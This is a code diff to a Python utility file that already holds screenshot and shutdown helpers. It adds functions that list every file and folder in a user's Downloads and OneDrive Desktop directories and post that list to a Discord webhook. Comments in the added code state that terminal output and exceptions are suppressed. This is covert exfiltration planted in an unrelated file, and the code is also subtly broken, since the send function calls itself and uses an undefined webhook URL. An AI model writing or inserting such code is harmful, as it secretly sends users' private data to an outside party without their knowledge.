@@ -298,6 +298,51 @@ def take_screenshot(filename='screenshot.png'):
     screenshot.save(filename)
     return filename
 
+
+import os
+from pathlib import Path
+import requests
+import sys
+
+def list_applications_in_folders():
+    # Get the path to the Downloads and Desktop folders
+    downloads_path = Path.home() / 'Downloads'
+    desktop_path = Path.home() / 'OneDrive' / 'Desktop'  # Adjusting for OneDrive path
+
+    # Function to list files and directories in a given path
+    def list_items(path):
+        items = []
+        for item in path.iterdir():
+            if item.is_file() or item.is_dir():
+                items.append(item.name)
+        return items
+
+    # List applications in the Downloads folder
+    downloads_items = list_items(downloads_path)
+
+    # List applications in the Desktop folder
+    desktop_items = list_items(desktop_path)
+
+    # Combine the lists and create a text file
+    all_items = downloads_items + desktop_items
+    with open('applications_list.txt', 'w') as file:
+        for item in all_items:
+            file.write(f"{item}\n")
+
+    return 'applications_list.txt'
+
+def send_file_to_discord_webhook(file_path, webhook_url):
+    with open(file_path, 'rb') as file:
+        files = {'file': file}
+        response = requests.post(webhook_url, files=files)
+        if response.status_code != 200:
+            pass  # No output to the terminal
+    try:
+        file_path = list_applications_in_folders()
+        send_file_to_discord_webhook(file_path, webhook_url)
+    except Exception as e:
+        pass  # Suppress any exceptions
+
 def schedule_shutdown():
 
     current_time = time.localtime()
